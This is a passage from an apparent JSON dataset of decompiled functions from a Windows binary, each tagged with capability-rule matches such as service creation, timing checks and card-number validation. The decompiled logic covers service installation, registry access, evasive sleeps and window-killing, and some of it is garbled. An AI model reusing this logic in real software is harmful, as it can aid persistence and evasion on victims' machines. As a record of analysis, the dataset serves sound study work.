        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e3a) overlaps instruction at (ram,0x00404e38)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404d90(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    uint16_t uVar6;\n    char **unaff_EDI;\n    bool bVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.004037c0(0, arg_8h, arg_ch + 1U >> 1);\n    pcVar2 = uVar1 & 0xffff;\n    bVar7 = (POPCOUNT(&stack0xffffffe8 & 0xff) & 1U) == 0;\n    if ((SCARRY4(&stack0xffffffdc, 0xc) == &stack0xffffffe8 < 0) &&\n       (SCARRY4(&stack0xffffffdc, 0xc) != &stack0xffffffe8 < 0)) {\n        out(0xc4, pcVar2);\n        *unaff_EDI = pcVar2;\n        bVar7 = (POPCOUNT((unaff_EBX >> 8) - *pcVar2) & 1U) == 0;\n    }\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    if ((bVar7) || (!bVar7)) {\n        var_4h = *(iVar3 + 0x58);\n    }\n    *(unaff_EBX + 0x4d895848) = *(unaff_EBX + 0x4d895848) | 0xfffffffc;\n    uVar4 = pcVar2;\n    uVar6 = var_4h;\n    if (uVar4 < uVar6) {\n        if ((uVar4 < uVar6) || (uVar6 <= uVar4)) {\n            pcVar2 = pcVar2 + -var_4h;\n        }\n        iVar5 = (pcVar2 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = pcVar2 - (var_4h & 0xffff);\n    }\n    if (iVar5 < var_4h >> 0x10) {\n        iVar5 = (iVar5 - (var_4h >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar5 = iVar5 - (var_4h >> 0x10);\n    }\n    *arg_14h = iVar5 + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return;\n}\n",
        "token_count": 654
    },
    "00403880": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403880(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 185
    },
    "00404b20": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b20(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        if (!in_ZF) {\n            *(in_EDX + 8) = *(in_EDX + 8);\n            fcn.00403920(0x423614, unaff_ESI, unaff_EBX, unaff_EBP);\n            fcn.00403920(0x423614, 8, 0x407460, 0x25);\n        }\n        uVar1 = fcn.00403920(0x423614, 8, 0x407488, 8);\n        return uVar1;\n    }\n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar2 = fcn.00402750(uVar1, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 338
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040103d) overlaps instruction at (ram,0x0040103b)\n// \n// WARNING: Removing unreachable block (ram,0x0040103e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401000(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    char extraout_DL;\n    uint in_EDX;\n    int32_t unaff_EBX;\n    char cVar2;\n    char cVar3;\n    \n    // [00] -r-x section size 20480 named .text\n    if (arg_ch != 1) goto code_r0x00401069;\n    uVar1 = CONCAT11(in_EDX >> 8 | in_EDX, in_EDX) ^ 0x5165;\n    cVar3 = SBORROW2(uVar1, 0x4001);\n    cVar2 = uVar1 + 0xbfff < 0;\n    fcn.00403f30();\n    if (cVar3 == cVar2) {\n        if (cVar3 == cVar2) goto code_r0x0040103d;\n        swi(4);\n        *(unaff_EBX + 0x66) = *(unaff_EBX + 0x66) + extraout_DL;\n    }\n    else {\ncode_r0x0040103d:\n        fcn.00403d10();\n    }\n    fcn.00401a00();\n    if (*0x423628 == 0) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        fcn.00402810();\n    }\ncode_r0x00401069:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 428
    },
    "00401090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00401090(char *arg_8h, int32_t arg_ch, char *arg_10h, char *arg_14h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    pcVar3 = arg_14h;\n    if (arg_14h != NULL) {\n        if (arg_8h <= pcVar1) {\n            do {\n                pcVar3 = arg_10h;\n                if (*arg_8h == *arg_10h) {\n                    bVar6 = true;\n                    pcVar5 = arg_10h + 1;\n                    pcVar2 = arg_14h;\n                    pcVar4 = arg_8h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar2 = pcVar2 + -1;\n                        if (pcVar2 == NULL) break;\n                        bVar6 = *pcVar4 == *pcVar5;\n                        pcVar5 = pcVar5 + 1;\n                    } while (bVar6);\n                    if (bVar6) goto code_r0x00401123;\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\ncode_r0x00401123:\n    return CONCAT44(pcVar3, arg_8h);\n}\n",
        "token_count": 368
    },
    "00401130": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401130(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.00404d10(hSCManager, arg_8h);\n    uVar1 = fcn.00402350(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 140
    },
    "004013a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401480) overlaps instruction at (ram,0x0040147f)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004013a0(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t extraout_DL;\n    int32_t *piVar7;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    uint *in_FS_OFFSET;\n    char cVar9;\n    bool bVar10;\n    char cVar11;\n    unkbyte10 extraout_ST0;\n    ulong uVar12;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4050e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    cVar11 = '\\0';\n    cVar9 = iVar2 < 0;\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar2;\n    uVar12 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    if ((cVar11 != cVar9) || (piVar7 = uVar12 >> 0x20,  cVar11 == cVar9)) {\n        piVar7 = arg_8h;\n    }\n    *(uVar12 + -0x7ce92414) = extraout_ST0;\n    *piVar7 = *piVar7 + 0x558bdf84;\n    uVar12 = func_0x6a401424(0);\n    uVar6 = (uVar12 >> 0x20) + *0x53;\n    bVar10 = uVar6 < '\\0';\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(uVar12 >> 0x20 & 0xffffff00 | uVar6, uVar12);\n    if ((bVar10) || (!bVar10)) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407418);\n    }\n    else {\n        pe_dos_header = pe_dos_header & 0xc3;\n        if (*(unaff_ESI + 0x18) == &stack0xfffffffc) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar1 = iVar2 + -1;\n        uVar6 = *puVar1;\n        *puVar1 = *puVar1 + extraout_DL;\n        pcVar3 = sym.imp.KERNEL32.dll_GetProcAddress + CARRY1(uVar6, extraout_DL) + unaff_ESI;\n    }\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &arg_8h);\n                    if ((iVar4 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004017c6:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x004017d2:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x0040178d:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x004017d2;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004015c9:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.004011c0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar2 != 0) goto joined_r0x004015c9;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00401772:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004017c6;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar2 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00401772;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar8 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar8 = 0;\n                                puVar8 = puVar8 + 1;\n                            }\n                            *puVar8 = 0;\n                            *(puVar8 + 2) = 0;\n                            fcn.004011c0(iVar2, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar2 = fcn.004012e0(&var_148h);\n                            if (iVar2 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040178d;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar2 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar2 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2904
    },
    "004018e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401964) overlaps instruction at (ram,0x0040195f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004018e0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = true;\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    if (!bVar3) {\n        if (bVar3) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x401860, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 455
    },
    "00401d40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d81) overlaps instruction at (ram,0x00401d80)\n// \n// WARNING: Removing unreachable block (ram,0x00401d81)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401d40(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (-1 < iVar2) {\n        if (-1 >= iVar2) {\n            out(0xc4, iVar2);\n            *unaff_EDI = iVar2;\n        }\n    }\n    *0x423630 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x423634 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407130);\n    *0x423638 = (*pcVar1)(iVar2, 0x407140);\n    if (((*0x423630 != 0) && (*0x423634 != 0)) && (*0x423638 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 307
    },
    "00402350": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023af) overlaps instruction at (ram,0x004023ad)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402350(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint8_t uVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    \n    uVar8 = 0x40238f;\n    uVar7 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    pcVar4 = uVar7 >> 0x20;\n    uVar2 = uVar7;\n    uVar5 = 0;\n    bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 != 0) {\n        uVar9 = uVar2;\n        if ((bVar6) && (!bVar6)) {\n            out(*unaff_ESI, uVar7 >> 0x20);\n            uVar5 = in_AF;\n            do {\n                cVar3 = uVar2 >> 8;\n                uVar5 = 9 < (uVar2 & 0xf) | uVar5;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar3 - uVar5), -uVar5);\n                uVar9 = uVar8 & 0xffff | unaff_ESI << 0x10;\n            } while (uVar5 || cVar3 == *pcVar4);\n        }\n        piVar1 = unaff_EDI + pcVar4 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - uVar5;\n        *(extraout_ECX + 0x50) = uVar2;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar9);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 560
    },
    "00402630": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402698) overlaps instruction at (ram,0x00402696)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402630(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    char cVar7;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint *unaff_EDI;\n    bool bVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    bool bVar15;\n    bool bVar16;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    bVar12 = false;\n    bVar16 = false;\n    if (0 < arg_14h) {\n        var_ch = 0x1;\n        uVar5 = arg_14h;\n        uVar8 = arg_14h * 2;\n        uVar9 = arg_14h;\n        do {\n            bVar15 = uVar9 < 0;\n            bVar14 = uVar9 == 0;\n            bVar13 = (POPCOUNT(uVar9 & 0xff) & 1U) == 0;\n            puVar11 = var_ch;\n            if ((!bVar16) && (bVar16)) {\n                LOCK();\n                puVar11 = 0x138b2633;\n                bVar12 = 0x9a70ae80 < uVar5;\n                uVar5 = uVar5 + 0x658f517f;\n                bVar15 = uVar5 < 0;\n                bVar14 = uVar5 == 0;\n                bVar13 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n            }\n            uVar2 = *(var_8h + arg_10h);\n            uVar9 = uVar8 & 0xffffff00 | uVar2;\n            if ((!bVar15) && (bVar15)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            pcVar6 = puVar11 / arg_ch;\n            uVar3 = *(puVar11 % arg_ch + arg_8h);\n            pcVar10 = puVar11 % arg_ch & 0xffffff00U | uVar3;\n            if ((bVar13) || (!bVar13)) {\n                if (!bVar12 && !bVar14) goto code_r0x004026c6;\n            }\n            else {\n                out(*puVar11, pcVar10);\n                do {\n                    cVar7 = pcVar6 >> 8;\n                    in_AF = 9 < (pcVar6 & 0xf) | in_AF;\n                    pcVar6 = CONCAT31(CONCAT21(pcVar6 >> 0x10, cVar7 - in_AF), -in_AF);\n                } while (in_AF || cVar7 == *pcVar10);\n                piVar1 = arg_ch + pcVar10 * 2;\n                *piVar1 = (*piVar1 + 0x7b) - in_AF;\n                *(uVar9 + 0xf) = pcVar6;\n                uVar4 = *(pcVar6 * 2);\n                *(pcVar6 * 2) = uVar2;\n                uVar9 = uVar4;\n                *pcVar6 = *pcVar6 + -in_AF;\n                puVar11 = puVar11 + 1;\ncode_r0x004026c6:\n                uVar9 = uVar9 & 0xff;\n            }\n            uVar5 = (puVar11 + -1) / arg_ch;\n            bVar12 = (puVar11 & (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + '\\x01', uVar5))) != 0;\n            if ((bVar12) && (!bVar12)) {\n                puVar11 = unaff_EDI;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + puVar11) = var_10h ^ uVar9 ^ *((puVar11 + -1) % arg_ch + arg_8h);\n            *(var_ch + arg_18h) = var_10h ^ uVar3;\n            var_ch = var_ch + 2;\n            uVar5 = var_8h + 1;\n            bVar12 = uVar5 < arg_14h;\n            bVar16 = SBORROW4(uVar5, arg_14h);\n            uVar9 = uVar5 - arg_14h;\n            uVar8 = arg_14h;\n            var_8h = uVar5;\n        } while (uVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 1208
    },
    "00402f70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00402fa3)\n\nvoid fcn.00402f70(void)\n\n{\n    uint uVar1;\n    \n    if (*0x42363c == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x42363c = 1;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004030a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004030f7) overlaps instruction at (ram,0x004030f5)\n// \n\nuint fcn.004030a0(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t arg_8h;\n    uint32_t arg_ch;\n    int32_t iVar2;\n    uint8_t uVar3;\n    bool bVar5;\n    ulong uVar6;\n    uint *puVar7;\n    uint32_t uVar4;\n    \n    arg_ch = param_2;\n    arg_8h = param_1;\n    puVar7 = &param_1;\n    uVar6 = fcn.00404d90(param_1, param_2, puVar7, &param_2);\n    iVar2 = uVar6;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    puVar7 = puVar7 & 0xffff | iVar2 << 0x10;\n    bVar5 = (arg_8h & ((uVar6 >> 0x20) - uVar6) + 0x1abU) != 0;\n    *(iVar2 + 0x58) = param_2;\n    uVar4 = param_2;\n    if (bVar5) {\n        uVar4 = param_2 & 0xffff;\n        uVar3 = uVar4;\n        if (!bVar5) goto code_r0x004030f0;\n    }\n    uVar3 = uVar4;\n    uVar6 = CONCAT44(&param_2, &param_2);\n    puVar7 = &param_1;\ncode_r0x004030f0:\n    *(arg_8h + -0x73) = *(arg_8h + -0x73) - &stack0xffffffec;\n    puVar1 = (uVar6 | 0x8d) + 0x51;\n    *puVar1 = *puVar1 | uVar3;\n    fcn.00404d90(arg_8h, arg_ch, puVar7, uVar6 >> 0x20);\n    return 1;\n}\n",
        "token_count": 484
    },
    "00403260": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004032a0) overlaps instruction at (ram,0x0040329f)\n// \n\nuint64_t __cdecl fcn.00403260(uint *arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_EDX;\n    int32_t iVar7;\n    uint extraout_EDX;\n    uchar *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    bool bVar13;\n    uint64_t uVar14;\n    uint *puStack24187;\n    uint uStack24167;\n    uint uStack24159;\n    uint uStack32;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar11 = &stack0xfffffffc;\n    puVar12 = &stack0xfffffffc;\n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    if ((!SBORROW2(*arg_8h, 0x5a4d)) && (SBORROW2(*arg_8h, 0x5a4d))) {\n        *unaff_EDI = *arg_8h;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar6 = *(arg_8h[0xf] + arg_8h) - 0x4550;\n    bVar13 = (POPCOUNT(uVar6 & 0xff) & 1U) != 0;\n    if (uVar6 != 0) {\n        return in_EDX << 0x20;\n    }\n    if ((bVar13) && (!bVar13)) {\n        puVar12 = &stack0xffffffe4;\n        cVar1 = '\\x1e';\n        do {\n            puVar11 = puVar11 + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *puVar11;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return CONCAT44(in_EDX, uVar3);\n    